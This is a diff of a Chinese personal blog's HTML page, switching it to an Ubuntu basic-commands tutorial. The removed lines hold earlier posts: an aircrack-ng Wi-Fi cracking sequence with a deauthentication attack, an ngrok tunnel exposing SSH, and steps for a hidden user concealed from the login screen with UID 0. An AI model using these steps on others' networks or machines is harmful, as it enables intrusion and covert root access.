@@ -19,23 +19,48 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
 
-    <meta property="og:type" content="website">
-<meta property="og:title" content="Weicheng Gao&#39;s Blog">
-<meta property="og:url" content="http://example.com/index.html">
+    <meta name="description" content="1.ls命令：列出文件夹内容这是 Linux 新用户首先学习的几个命令之一。此命令可让您查看当前文件夹中有哪些文件和文件夹。 1ls    您可以使用长列表选项 ls -l 查看文件大小、权限、修改时间等详细信息。如果需要，您可以对这些选项进行排序和控制。 1ls -l   相关阅读：ls命令示例 2.cd命令：更改目录默认情况下，您从主目录开始。您经常需要更改目录并移动到另一个目录。 例如，您下">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ubuntu基本命令">
+<meta property="og:url" content="http://example.com/2024/07/27/ubuntu%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/index.html">
 <meta property="og:site_name" content="Weicheng Gao&#39;s Blog">
+<meta property="og:description" content="1.ls命令：列出文件夹内容这是 Linux 新用户首先学习的几个命令之一。此命令可让您查看当前文件夹中有哪些文件和文件夹。 1ls    您可以使用长列表选项 ls -l 查看文件大小、权限、修改时间等详细信息。如果需要，您可以对这些选项进行排序和控制。 1ls -l   相关阅读：ls命令示例 2.cd命令：更改目录默认情况下，您从主目录开始。您经常需要更改目录并移动到另一个目录。 例如，您下">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cn.linux-console.net/common-images/essential-ubuntu-commands/ls-command-ubuntu.png">
+<meta property="og:image" content="https://cn.linux-console.net/common-images/essential-ubuntu-commands/cd-command-examples.png">
+<meta property="og:image" content="https://cn.linux-console.net/common-images/essential-ubuntu-commands/cat-command-example.png">
+<meta property="og:image" content="https://cn.linux-console.net/common-images/essential-ubuntu-commands/reading-large-files-with-less-command.png">
+<meta property="og:image" content="https://cn.linux-console.net/common-images/essential-ubuntu-commands/touch-command-ubuntu.png">
+<meta property="og:image" content="https://cn.linux-console.net/common-images/essential-ubuntu-commands/mkdir-command-example.png">
+<meta property="og:image" content="https://cn.linux-console.net/common-images/essential-ubuntu-commands/cp-command-example.png">
+<meta property="og:image" content="https://cn.linux-console.net/common-images/essential-ubuntu-commands/mv-command-example.png">
+<meta property="og:image" content="https://cn.linux-console.net/common-images/essential-ubuntu-commands/rm-command-examples.png">
+<meta property="og:image" content="https://cn.linux-console.net/common-images/essential-ubuntu-commands/nano-command-example.png">
+<meta property="og:image" content="https://cn.linux-console.net/common-images/essential-ubuntu-commands/list-processes-ubuntu.webp">
+<meta property="og:image" content="https://cn.linux-console.net/common-images/essential-ubuntu-commands/top-command-ubuntu.png">
+<meta property="og:image" content="https://cn.linux-console.net/common-images/essential-ubuntu-commands/grep-command-examples.png">
+<meta property="og:image" content="https://cn.linux-console.net/common-images/essential-ubuntu-commands/find-kill-process-ubuntu.png">
+<meta property="og:image" content="https://cn.linux-console.net/common-images/essential-ubuntu-commands/taken-meme-find-you-kill-you.jpg">
+<meta property="og:image" content="https://cn.linux-console.net/common-images/essential-ubuntu-commands/history-command-ubuntu.png">
+<meta property="og:image" content="https://cn.linux-console.net/common-images/essential-ubuntu-commands/lshw-command-examples.png">
+<meta property="og:image" content="https://cn.linux-console.net/common-images/essential-ubuntu-commands/using-sudo-example-ubuntu.png">
+<meta property="og:image" content="https://cn.linux-console.net/common-images/essential-ubuntu-commands/ip-address-check-ubuntu.png">
+<meta property="og:image" content="https://cn.linux-console.net/common-images/essential-ubuntu-commands/ping-command-ubuntu.png">
+<meta property="article:published_time" content="2024-07-27T14:11:15.000Z">
+<meta property="article:modified_time" content="2024-07-27T14:59:04.000Z">
 <meta property="article:author" content="Weicheng Gao">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cn.linux-console.net/common-images/essential-ubuntu-commands/ls-command-ubuntu.png">
 
 
-<link rel="canonical" href="http://example.com/">
+<link rel="canonical" href="http://example.com/2024/07/27/ubuntu%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"index.html","title":""}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2024/07/27/ubuntu%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/","path":"2024/07/27/ubuntu基本命令/","title":"ubuntu基本命令"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>Weicheng Gao's Blog</title>
+<title>ubuntu基本命令 | Weicheng Gao's Blog</title>
   
 
 
@@ -65,7 +90,7 @@
 
     <a href="/" class="brand" rel="start">
       <i class="logo-line"></i>
-      <h1 class="site-title">Weicheng Gao's Blog</h1>
+      <p class="site-title">Weicheng Gao's Blog</p>
       <i class="logo-line"></i>
     </a>
   </div>
@@ -87,7 +112,7 @@
   
   <aside class="sidebar">
 
-    <div class="sidebar-inner sidebar-overview-active">
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
           文章目录
@@ -100,6 +125,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-ls%E5%91%BD%E4%BB%A4%EF%BC%9A%E5%88%97%E5%87%BA%E6%96%87%E4%BB%B6%E5%A4%B9%E5%86%85%E5%AE%B9"><span class="nav-number">1.</span> <span class="nav-text">1.ls命令：列出文件夹内容</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-cd%E5%91%BD%E4%BB%A4%EF%BC%9A%E6%9B%B4%E6%94%B9%E7%9B%AE%E5%BD%95"><span class="nav-number">2.</span> <span class="nav-text">2.cd命令：更改目录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-cat%E5%91%BD%E4%BB%A4%EF%BC%9A%E8%AF%BB%E5%8F%96%E6%96%87%E6%9C%AC%E6%96%87%E4%BB%B6"><span class="nav-number">3.</span> <span class="nav-text">3. cat命令：读取文本文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-less%E5%91%BD%E4%BB%A4%EF%BC%9A%E8%AF%BB%E5%8F%96%E5%A4%A7%E6%96%87%E6%9C%AC%E6%96%87%E4%BB%B6"><span class="nav-number">4.</span> <span class="nav-text">4. less命令：读取大文本文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-touch%E5%91%BD%E4%BB%A4%EF%BC%9A%E5%88%9B%E5%BB%BA%E6%96%B0%E6%96%87%E4%BB%B6"><span class="nav-number">5.</span> <span class="nav-text">5. touch命令：创建新文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-mkdir-%E5%91%BD%E4%BB%A4%EF%BC%9A%E5%88%9B%E5%BB%BA%E6%96%B0%E6%96%87%E4%BB%B6%E5%A4%B9"><span class="nav-number">6.</span> <span class="nav-text">6. mkdir 命令：创建新文件夹</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-cp%E5%91%BD%E4%BB%A4%EF%BC%9A%E5%A4%8D%E5%88%B6%E6%96%87%E4%BB%B6%E5%92%8C%E6%96%87%E4%BB%B6%E5%A4%B9"><span class="nav-number">7.</span> <span class="nav-text">7. cp命令：复制文件和文件夹</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-mv-%E5%91%BD%E4%BB%A4%EF%BC%9A%E5%89%AA%E5%88%87%E7%B2%98%E8%B4%B4%E6%88%96%E9%87%8D%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%E5%92%8C%E6%96%87%E4%BB%B6%E5%A4%B9"><span class="nav-number">8.</span> <span class="nav-text">8. mv 命令：剪切粘贴或重命名文件和文件夹</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-rm%E5%91%BD%E4%BB%A4%EF%BC%9A%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6%E5%92%8C%E6%96%87%E4%BB%B6%E5%A4%B9"><span class="nav-number">9.</span> <span class="nav-text">9. rm命令：删除文件和文件夹</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#10-nano%EF%BC%9A%E7%BC%96%E8%BE%91%E6%96%87%E4%BB%B6"><span class="nav-number">10.</span> <span class="nav-text">10.nano：编辑文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#11-clear%EF%BC%9A%E6%B8%85%E9%99%A4%E7%BB%88%E7%AB%AF%E5%B1%8F%E5%B9%95"><span class="nav-number">11.</span> <span class="nav-text">11.clear：清除终端屏幕</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#12-ps%EF%BC%9A%E6%9F%A5%E7%9C%8B%E5%B9%B6%E5%A4%84%E7%90%86%E8%BF%9B%E7%A8%8B"><span class="nav-number">12.</span> <span class="nav-text">12. ps：查看并处理进程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#13-%E9%A1%B6%E9%83%A8%EF%BC%9A%E7%B3%BB%E7%BB%9F%E7%9B%91%E8%A7%86%E5%99%A8"><span class="nav-number">13.</span> <span class="nav-text">13.顶部：系统监视器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#14-lsblk%EF%BC%9A%E5%88%97%E5%87%BA%E7%A3%81%E7%9B%98%E5%92%8C%E5%88%86%E5%8C%BA"><span class="nav-number">14.</span> <span class="nav-text">14. lsblk：列出磁盘和分区</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#15-fdisk%EF%BC%9A%E5%88%97%E5%87%BA%E5%92%8C%E7%AE%A1%E7%90%86%E7%A3%81%E7%9B%98%E5%92%8C%E5%88%86%E5%8C%BA"><span class="nav-number">15.</span> <span class="nav-text">15. fdisk：列出和管理磁盘和分区</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#16-find%EF%BC%9A%E6%90%9C%E7%B4%A2%E6%96%87%E4%BB%B6"><span class="nav-number">16.</span> <span class="nav-text">16. find：搜索文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#17-grep%EF%BC%9A%E5%9C%A8%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E4%B8%AD%E6%90%9C%E7%B4%A2"><span class="nav-number">17.</span> <span class="nav-text">17. grep：在文件内容中搜索</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#18-kill%EF%BC%9A%E7%BB%88%E6%AD%A2%E8%BF%9B%E7%A8%8B"><span class="nav-number">18.</span> <span class="nav-text">18.kill：终止进程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#19-history%EF%BC%9A%E5%9B%9E%E9%A1%BE%E4%B8%80%E4%B8%8B%E4%BD%A0%E8%BF%87%E5%8E%BB%E8%BF%90%E8%A1%8C%E8%BF%87%E5%93%AA%E4%BA%9B%E5%91%BD%E4%BB%A4"><span class="nav-number">19.</span> <span class="nav-text">19.history：回顾一下你过去运行过哪些命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#20-chmod%EF%BC%9A%E6%9B%B4%E6%94%B9%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90"><span class="nav-number">20.</span> <span class="nav-text">20. chmod：更改文件权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#21-lshw%EF%BC%9A%E8%8E%B7%E5%8F%96%E7%A1%AC%E4%BB%B6%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF"><span class="nav-number">21.</span> <span class="nav-text">21.lshw：获取硬件详细信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#22-sudo%EF%BC%9A%E4%BB%A5root%E6%9D%83%E9%99%90%E8%BF%90%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-number">22.</span> <span class="nav-text">22. sudo：以root权限运行命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#23-apt%EF%BC%9A%E5%AE%89%E8%A3%85%E3%80%81%E5%88%A0%E9%99%A4%E5%92%8C%E7%AE%A1%E7%90%86-deb%E5%8C%85"><span class="nav-number">23.</span> <span class="nav-text">23. apt：安装、删除和管理.deb包</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#24-add-apt-repository%EF%BC%9A%E6%B7%BB%E5%8A%A0%E5%92%8C%E5%88%A0%E9%99%A4-PPA"><span class="nav-number">24.</span> <span class="nav-text">24. add-apt-repository：添加和删除 PPA</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#25-snap%EF%BC%9A%E5%AE%89%E8%A3%85%E3%80%81%E5%88%A0%E9%99%A4%E5%92%8C%E7%AE%A1%E7%90%86snap%E5%8C%85"><span class="nav-number">25.</span> <span class="nav-text">25. snap：安装、删除和管理snap包</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#26-ip%EF%BC%9A%E6%9F%A5%E7%9C%8BIP%E5%9C%B0%E5%9D%80%E7%AD%89%E4%BF%A1%E6%81%AF"><span class="nav-number">26.</span> <span class="nav-text">26. ip：查看IP地址等信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#27-ping%EF%BC%9A%E6%A3%80%E6%9F%A5%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E6%98%AF%E5%90%A6%E5%8F%AF%E8%BE%BE"><span class="nav-number">27.</span> <span class="nav-text">27. ping：检查远程系统是否可达</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#28-ssh%EF%BC%9A%E8%BF%9E%E6%8E%A5%E5%88%B0%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F"><span class="nav-number">28.</span> <span class="nav-text">28. ssh：连接到远程系统</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#29-scp%EF%BC%9A%E5%9C%A8%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E4%B9%8B%E9%97%B4%E5%A4%8D%E5%88%B6%E6%96%87%E4%BB%B6"><span class="nav-number">29.</span> <span class="nav-text">29. scp：在远程系统之间复制文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#30-exit%EF%BC%9A%E5%85%B3%E9%97%AD%E7%BB%88%E7%AB%AF"><span class="nav-number">30.</span> <span class="nav-text">30.exit：关闭终端</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#31-shutdown%EF%BC%9A%E5%85%B3%E9%97%AD%E6%88%96%E9%87%8D%E6%96%B0%E5%90%AF%E5%8A%A8%E7%B3%BB%E7%BB%9F"><span class="nav-number">31.</span> <span class="nav-text">31. shutdown：关闭或重新启动系统</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%9D%E5%A4%96%E6%8F%90%E7%A4%BA%EF%BC%9Aman%EF%BC%9A%E8%AF%A6%E7%BB%86%E4%BA%86%E8%A7%A3%E5%91%BD%E4%BB%A4"><span class="nav-number">32.</span> <span class="nav-text">额外提示：man：详细了解命令</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -133,640 +159,17 @@
 
     </div>
 
-    <div class="main-inner index posts-expand">
+    <div class="main-inner post posts-expand">
 
-    
+
+  
 
 
 <div class="post-block">
   
   
 
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/08/22/kali-liunx%E7%A0%B4%E8%A7%A3Wi-Fi%E5%AF%86%E7%A0%81/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Weicheng Gao">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Weicheng Gao's Blog">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Weicheng Gao's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2024/08/22/kali-liunx%E7%A0%B4%E8%A7%A3Wi-Fi%E5%AF%86%E7%A0%81/" class="post-title-link" itemprop="url">kali-liunx破解Wi-Fi密码</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2024-08-22 22:30:08" itemprop="dateCreated datePublished" datetime="2024-08-22T22:30:08+08:00">2024-08-22</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2024-08-23 14:55:09" itemprop="dateModified" datetime="2024-08-23T14:55:09+08:00">2024-08-23</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="kali-liunx破解Wi-Fi密码"><a href="#kali-liunx破解Wi-Fi密码" class="headerlink" title="kali-liunx破解Wi-Fi密码"></a>kali-liunx破解Wi-Fi密码</h2><h3 id="1-jinru-root"><a href="#1-jinru-root" class="headerlink" title="1.jinru root"></a>1.jinru root</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start wlan1</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng wlan1</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="5"><a href="#5" class="headerlink" title="5."></a>5.</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng -w &lt;name&gt; -c &lt;ch&gt; --bssid &lt;bssid&gt; wlan1</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="6"><a href="#6" class="headerlink" title="6."></a>6.</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -0 10 -a &lt;bssid&gt; -c &lt;station&gt; wlan1</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="7"><a href="#7" class="headerlink" title="7."></a>7.</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -w &lt;password.txt&gt; &lt;name&gt;-*.<span class="built_in">cap</span></span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/08/21/ssh%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Weicheng Gao">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Weicheng Gao's Blog">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Weicheng Gao's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2024/08/21/ssh%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5/" class="post-title-link" itemprop="url">ssh远程连接</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2024-08-21 11:42:19 / 修改时间：11:54:06" itemprop="dateCreated datePublished" datetime="2024-08-21T11:42:19+08:00">2024-08-21</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="1-在-szx-电脑上安装-ngrok："><a href="#1-在-szx-电脑上安装-ngrok：" class="headerlink" title="1. 在 szx 电脑上安装 ngrok："></a>1. 在 szx 电脑上安装 ngrok：</h3><p>   如果还没有安装 <code>ngrok</code>，可以先安装：</p>
-   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install ngrok</span><br></pre></td></tr></table></figure>
-<p>   或者从 <a target="_blank" rel="noopener" href="https://ngrok.com/">ngrok 官方网站</a> 下载并安装。</p>
-<h3 id="2-配置-ngrok-的开机自启动："><a href="#2-配置-ngrok-的开机自启动：" class="headerlink" title="2.配置 ngrok 的开机自启动："></a>2.配置 <code>ngrok</code> 的开机自启动：</h3><p>   为了在每次开机时自动启动 <code>ngrok</code> 并暴露 SSH 端口，可以通过设置一个系统服务来实现。</p>
-<h4 id="1-创建-ngrok-服务文件："><a href="#1-创建-ngrok-服务文件：" class="headerlink" title="1. 创建 ngrok 服务文件："></a>1. <strong>创建 ngrok 服务文件</strong>：</h4><p>  在 <strong>szx</strong> 电脑上，创建一个新的 systemd 服务文件：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> vim /etc/systemd/system/ngrok.service</span><br></pre></td></tr></table></figure>
-
-<h4 id="2-添加以下内容："><a href="#2-添加以下内容：" class="headerlink" title="2. 添加以下内容："></a>2. <strong>添加以下内容</strong>：</h4><p>  替换 <code>YOUR_AUTH_TOKEN</code> 为你的 ngrok 认证令牌（可以从 ngrok 网站获取）：</p>
-<pre><code>  [Unit]
-  Description=Ngrok SSH Tunnel
-  After=network.target
-  
-  [Service]
-  ExecStart=/usr/bin/ngrok tcp 22 --authtoken YOUR_AUTH_TOKEN
-  Restart=on-failure
-  User=szx
-  
-  [Install]
-  WantedBy=multi-user.target
-</code></pre>
-<h4 id="3-保存并关闭文件。"><a href="#3-保存并关闭文件。" class="headerlink" title="3.保存并关闭文件。"></a>3.保存并关闭文件。</h4><h4 id="4-启用和启动服务："><a href="#4-启用和启动服务：" class="headerlink" title="4.启用和启动服务："></a>4.启用和启动服务：</h4><p>  启用并启动 <code>ngrok</code> 服务，使其在系统启动时自动运行：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl <span class="built_in">enable</span> ngrok.service</span><br><span class="line"><span class="built_in">sudo</span> systemctl start ngrok.service</span><br></pre></td></tr></table></figure>
-
-<h4 id="5-获取-ngrok-地址："><a href="#5-获取-ngrok-地址：" class="headerlink" title="5. 获取 ngrok 地址："></a>5. 获取 ngrok 地址：</h4><p>  每次启动后，你可以使用以下命令查看 <code>ngrok</code> 提供的地址：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">journalctl -u ngrok.service -f</span><br></pre></td></tr></table></figure>
-
-<p>  或者你可以将地址通过邮件或其他方式通知 <strong>gao</strong></p>
-<h3 id="3-在-gao-电脑上连接："><a href="#3-在-gao-电脑上连接：" class="headerlink" title="3.在 gao 电脑上连接："></a>3.在 gao 电脑上连接：</h3><p>   gao 可以通过 <code>ngrok</code> 提供的地址进行 SSH 连接：</p>
-   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh szx@0.tcp.ngrok.io -p 17022</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/08/21/liunx%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Weicheng Gao">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Weicheng Gao's Blog">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Weicheng Gao's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2024/08/21/liunx%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7/" class="post-title-link" itemprop="url">liunx创建隐藏用户</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2024-08-21 10:26:40 / 修改时间：11:42:25" itemprop="dateCreated datePublished" datetime="2024-08-21T10:26:40+08:00">2024-08-21</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="在Liunx里创建一个隐藏用户"><a href="#在Liunx里创建一个隐藏用户" class="headerlink" title="在Liunx里创建一个隐藏用户"></a>在Liunx里创建一个隐藏用户</h2><h3 id="1-创建用户gao并隐藏其登陆界面显示"><a href="#1-创建用户gao并隐藏其登陆界面显示" class="headerlink" title="1.创建用户gao并隐藏其登陆界面显示"></a>1.创建用户gao并隐藏其登陆界面显示</h3><p>首先，创建用户gao，并将其home目录设置为系统路径，如&#x2F;var&#x2F;gao，避免在默认的&#x2F;home目录下创建用户，这样可以增强隐蔽性</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> useradd -m -d /var/gao -s /bin/bash gao</span><br><span class="line"><span class="built_in">sudo</span> passwd gao</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="2-隐藏用户gao的开机登陆显示"><a href="#2-隐藏用户gao的开机登陆显示" class="headerlink" title="2.隐藏用户gao的开机登陆显示"></a>2.隐藏用户gao的开机登陆显示</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> vim /var/lib/AccountsService/users/gao</span><br></pre></td></tr></table></figure>
-
-<p>在文件中添加以下内容</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[User]</span><br><span class="line">SystemAccount=<span class="literal">true</span></span><br></pre></td></tr></table></figure>
-
-<p>保存并退出，这样用户gao就不会出现在开机登陆页面了</p>
-<h3 id="3-赋予用户gao与root一样的权限"><a href="#3-赋予用户gao与root一样的权限" class="headerlink" title="3.赋予用户gao与root一样的权限"></a>3.赋予用户gao与root一样的权限</h3><p>可以将其UID设为0</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> usermod -u 0 -o gao</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
